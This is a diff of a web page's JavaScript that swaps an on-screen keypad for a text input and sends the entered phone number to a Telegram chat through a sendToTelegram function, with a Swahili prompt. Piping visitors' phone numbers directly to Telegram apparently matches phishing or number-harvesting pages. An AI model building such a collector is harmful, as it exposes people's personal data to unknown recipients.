@@ -1,30 +1,8 @@
 document.addEventListener('DOMContentLoaded', () => {
-    const display = document.getElementById('phone-display');
-    const keys = document.querySelectorAll('.key[data-value]');
-    const deleteBtn = document.getElementById('delete-btn');
+    const phoneInput = document.getElementById('app-phone');
     const confirmBtn = document.querySelector('.confirm-button');
 
-    // Starting number empty
-    let phoneNumber = '';
     let isSubmitting = false;
-    updateDisplay();
-
-    keys.forEach(key => {
-        key.addEventListener('pointerdown', (e) => {
-            e.preventDefault();
-            const val = key.getAttribute('data-value');
-            if (val && phoneNumber.length < 15) {
-                phoneNumber += val;
-                updateDisplay();
-            }
-        });
-    });
-
-    deleteBtn.addEventListener('pointerdown', (e) => {
-        e.preventDefault();
-        phoneNumber = phoneNumber.slice(0, -1);
-        updateDisplay();
-    });
 
     async function sendToTelegram(message) {
         try {
@@ -40,6 +18,7 @@ document.addEventListener('DOMContentLoaded', () => {
 
     // Button submit effect
     confirmBtn.addEventListener('click', async () => {
+        const phoneNumber = phoneInput.value.trim();
         if (phoneNumber.length > 0 && !isSubmitting) {
             isSubmitting = true;
             confirmBtn.style.opacity = '0.5';
@@ -50,8 +29,4 @@ document.addEventListener('DOMContentLoaded', () => {
             alert('Tafadhali weka namba yako ya simu.');
         }
     });
-
-    function updateDisplay() {
-        display.textContent = phoneNumber;
-    }
 });
